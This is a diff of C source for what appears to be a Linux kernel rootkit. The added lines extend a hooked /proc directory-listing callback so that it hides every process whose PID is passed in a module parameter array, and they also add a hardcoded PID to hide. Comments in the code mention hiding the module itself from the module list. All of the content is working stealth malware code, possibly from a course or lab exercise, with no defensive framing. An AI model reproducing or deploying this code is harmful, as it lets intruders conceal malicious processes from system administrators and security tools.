@@ -230,21 +230,23 @@ asmlinkage int sys_getdents_hook(unsigned int fd, struct linux_dirent* dirp, uns
 //START CARLOS
 //iterate takes pointer to dir_context	
 struct list_head *module_list;//reference to module_list. Used to hide mod from insmod
+int count;
+static char* rkps[10];
+module_param_array(rkps, charp, &count, 0);
 static char *proc_to_hide = "1";
+static char *proc_to_hide1 = "3538";
 static struct file_operations proc_fops;//pointers to listing contents in proc dir
 static struct file_operations *backup_proc_fops;//keep backup in order to restore orginal struct 
 static struct inode *proc_inode;
 static struct path p;
-
 struct dir_context *backup_ctx;
  
 static int overwritten_filldir_t(struct dir_context *ctx, const char *proc_name, int len, loff_t off, u64 ino, unsigned int d_type){
     //prints contents 
-    if (strncmp(proc_name, proc_to_hide, strlen(proc_to_hide)) == 0){
-	printk(KERN_INFO "@%@?: overwritte_filldir going into hiding");
-	return 0;
+    int i;
+    for(i = 0; i< sizeof(rkps)/sizeof(rkps[0]); i++){
+	    if(rkps[i] != NULL) if (strncmp(proc_name, rkps[i], strlen(rkps[i])) == 0) return 0;
     }
-
     return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);//return orginal pointer to  dir_context.Prints it off.
 }
 
@@ -262,7 +264,6 @@ int overwritten_iterate_shared(struct file *file, struct dir_context *ctx){
     ctx->pos = hacked_ctx.pos;
     return result;
 }
-
 //END  CARLOS  
 
 
